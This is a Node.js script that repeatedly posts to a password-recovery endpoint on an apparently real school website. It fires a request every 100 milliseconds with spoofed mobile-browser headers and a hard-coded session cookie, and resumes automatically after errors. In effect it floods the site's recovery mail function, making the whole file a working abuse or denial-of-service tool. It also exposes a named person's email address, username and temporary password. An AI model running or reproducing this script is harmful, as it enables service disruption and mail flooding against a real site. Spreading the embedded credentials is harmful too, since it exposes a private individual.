const axios = require('axios');
const qs = require('qs');

let interval = null;
let paused = false;

const sendRequest = () => {
	if (paused) return;

	let data = qs.stringify({
		'userName': 'Nethanel Ain  Dema-ala Debulgado',
		'userEmail': 'nethaneldebulgado0826@gmail.com',
		'tmpUserName': 'NDD08262005',
		'tmpPassword': 'ou$5]4'
	});

	let config = {
		method: 'POST',
		url: 'https://lcccautomate.net/alams/contact_mail_recover.php',
		headers: {
			'User-Agent': 'Mozilla/5.0 (Linux; Android 13...)',
			'Accept-Encoding': 'gzip, deflate, br, zstd',
			'sec-ch-ua-platform': '"Android"',
			'X-Requested-With': 'XMLHttpRequest',
			'sec-ch-ua': '"Not)A;Brand";v="8", "Chromium";v="138", "Android WebView";v="138"',
			'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
			'sec-ch-ua-mobile': '?1',
			'Origin': 'https://lcccautomate.net',
			'Sec-Fetch-Site': 'same-origin',
			'Sec-Fetch-Mode': 'cors',
			'Sec-Fetch-Dest': 'empty',
			'Referer': 'https://lcccautomate.net/alams/recover.php',
			'Accept-Language': 'en-US,en;q=0.9',
			'Cookie': 'PHPSESSID=a707ebf6ddfdc8f4b0ce4daff45fb4ff; nfd-enable-cf-opt=63a6825d27cab0f204d3b602'
		},
		data: data
	};

	axios.request(config)
		.then(response => {
			console.log(`[${new Date().toISOString()}] Response:`, response.data);
		})
		.catch(error => {
			console.error(`[${new Date().toISOString()}] Error:`, error.message);
			if (!paused) {
				console.log(`[${new Date().toISOString()}] Detected error. Pausing requests for 10 seconds...`);
				paused = true;
				clearInterval(interval);
				setTimeout(() => {
					console.log(`[${new Date().toISOString()}] Resuming requests...`);
					paused = false;
					interval = setInterval(sendRequest, 100);
				}, 10000);
			}
		});
};

// Start the interval
interval = setInterval(sendRequest, 100);
// Also send immediately once
sendRequest();
